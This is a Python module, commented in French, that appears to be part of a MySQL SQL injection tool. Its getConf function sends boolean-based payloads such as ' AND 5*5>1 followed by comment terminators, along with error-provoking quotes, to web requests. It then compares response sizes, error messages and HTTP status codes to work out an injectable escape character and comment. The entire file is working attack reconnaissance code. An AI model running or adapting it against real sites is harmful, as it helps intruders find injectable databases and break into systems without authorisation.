#coding:utf-8

from req_ import req
from re import search
from data.mysql import *
import urllib.parse

def getConf(body, config):

	badChar = [
		'\'',
		'"'
	]
	
	escape = [
		'\'',
		'"',
		'%20'
	]

	err_ = ''
	char_ = ''
	
	# Déctection BOOLEAN BASED
	r = req(body, '$1337$')

	for char in escape:
		for com in MySQL['comment']:

			# Créations des payloads
			p = ' {} AND 5*5>1 {}'.format(char, com)
			p2 = ' {} AND 7*7>1 {}'.format(char, com)
			p3 = ' {} AND 5*5>100 {}'.format(char, com)
			p4 = ' {} AND 7*7>100 {}'.format(char, com)

			# Requête HTTP
			rep = req(body, p)
			rep2 = req(body, p2)
			rep3 = req(body, p3)
			rep4 = req(body, p4)

			# On check si l'input est réfléchie
			if '$1337$' in r['body']:

				# On supprime notre payload qui est réfléchie pour éviter les faux résultats positive
				rep['size'] = len(rep['body'].replace(urllib.parse.unquote_plus(p), ''))
				rep2['size'] = len(rep2['body'].replace(urllib.parse.unquote_plus(p2), ''))
				rep3['size'] = len(rep3['body'].replace(urllib.parse.unquote_plus(p3), ''))
				rep4['size'] = len(rep4['body'].replace(urllib.parse.unquote_plus(p4), ''))
			
			# Attention risque de faux résultats
			if rep['size'] == rep2['size'] and rep3['size'] == rep4['size'] and rep['size'] != rep3['size']:

				config['escape'] = char
				config['comment'] = com
				config['size'] = rep['size']# On stocke la taille de la page qd ça retourne true
				config['detection'] = 'booleanBased'

				return True
	
	

	# Détection basée sur les messages d'erreurs (STRING context only)

	# On regarde quel caractère déjà génére une erreur
	for char in badChar:
			rep = req(body, char)

			# recherche d'erreurs ...
			for err in MySQL['error']:
				# confirmation de la vulnérabilité
				if err in rep['body']:

					# Récupération du caractère qui échappe la requête
					char_ = char
					err_ = err

					# On recherche le commentaire qui ferme la bonne requête
					for com in MySQL['comment']:
						rep = req(body, char_ + com)
						# Si il n'y a pas d'erreur le payload est valide
						if err not in rep['body']:

							config['dbms'] = 'MySQL'
							config['escape'] = char_
							config['comment'] = com
							config['detection'] = 'errorBased'

							return True
							break
							
	# Déctection basée sur les messages d'erreurs (INTEGER context)

	# Vérification que la cible à bien générer une erreur			
	if err_:
		for com in MySQL['comment']:
			rep = req(body, com)
			for err in MySQL['error']:
				if err not in rep['body']:
					config['dbms'] = 'MySQL'
					config['comment'] = com
					config['detection'] = 'errorBased'
					return True
					break

	# Déction basée sur le code HTTP

	for char in badChar:
		for com in MySQL['comment']:
			rep = req(body, char)# Ne pas mettre de commetaire à la fin !
			rep2 = req(body, char + char + com)

			if search(r'^5', rep['code']) and search(r'^2', rep2['code']):

				config['escape'] = char
				config['comment'] = com

				return True
				break
				
	# Comparaison pour integer context
	
	for com in MySQL['comment']:
		
		rep = req(body, '\'')# On génére un code 500 en premier
		rep2 = req(body, '' + com)# Attention peut générer des faux résultats 

		if search(r'^5', rep['code']) and search(r'^2', rep2['code']):

			config['comment'] = com
			config['detection'] = 'codeBased'

			return True	
		
